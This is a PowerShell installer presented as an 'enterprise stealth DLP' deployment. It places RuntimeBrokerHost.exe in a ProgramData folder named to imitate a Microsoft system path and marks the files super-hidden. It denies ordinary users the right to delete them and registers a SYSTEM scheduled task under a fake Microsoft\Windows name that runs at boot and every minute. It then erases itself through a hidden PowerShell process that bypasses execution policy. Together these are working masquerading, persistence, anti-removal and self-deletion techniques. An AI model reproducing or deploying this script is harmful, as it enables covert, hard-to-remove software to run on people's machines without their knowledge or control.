# ==============================================================================
# Enterprise Stealth DLP Deployment Script
# Installs RuntimeBrokerHost under NT AUTHORITY\SYSTEM with Anti-Kill Protection
# ==============================================================================
$ErrorActionPreference = "SilentlyContinue"

$targetDir = "$env:ProgramData\Microsoft\Crypto\SystemBroker"
$exeName = "RuntimeBrokerHost.exe"
$cfgName = "config.json"
$sourceDir = $PSScriptRoot

# 1. Stop any currently running instance
taskkill.exe /F /IM $exeName >$null 2>&1
Stop-Process -Name "RuntimeBrokerHost" -Force -ErrorAction SilentlyContinue

# 2. Create target directory
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

# 3. Copy binary and config
Copy-Item "$sourceDir\$exeName" "$targetDir\$exeName" -Force
if (Test-Path "$sourceDir\$cfgName") {
    Copy-Item "$sourceDir\$cfgName" "$targetDir\$cfgName" -Force
}

# 4. Mark Super-Hidden (+h +s: Protected Operating System file)
& attrib.exe +h +s $targetDir
& attrib.exe +h +s "$targetDir\$exeName"
if (Test-Path "$targetDir\$cfgName") {
    & attrib.exe +h +s "$targetDir\$cfgName"
}

# 5. Lock NTFS Permissions (ANTI-DELETE & ANTI-TAMPER)
# SYSTEM and Administrators: Full Control
# Standard Users: Read & Execute (so it runs), but DENIED Delete, Modify, or Change Permissions
& icacls.exe $targetDir /inheritance:r /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" /grant "BUILTIN\Administrators:(OI)(CI)F" /grant "BUILTIN\Users:(OI)(CI)RX" /deny "BUILTIN\Users:(DE,DC,WDAC,WO)" >$null 2>&1

# 6. Register Task strictly under NT AUTHORITY\SYSTEM (Works on battery & AC)
$taskName = "Microsoft\Windows\Runtime\SystemBrokerHost"
$action = New-ScheduledTaskAction -Execute "$targetDir\$exeName"
$triggerBoot = New-ScheduledTaskTrigger -AtStartup
$triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit 0 -MultipleInstancesPolicy IgnoreNew
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggerBoot, $triggerRepeat -Settings $settings -Principal $principal -Force | Out-Null

# 7. Start the task immediately under NT AUTHORITY\SYSTEM
Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

# 8. Self-Destruct: Cleanly delete the installer source folder from background %TEMP%
$cleanerScript = "$env:TEMP\dlp_cleaner_$([guid]::NewGuid().ToString('N')).ps1"
$scriptContent = @"
Start-Sleep -Seconds 2
Remove-Item -Path '$sourceDir' -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path `$MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
"@
$scriptContent | Out-File -FilePath $cleanerScript -Encoding utf8 -Force

Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanerScript`"" -WindowStyle Hidden
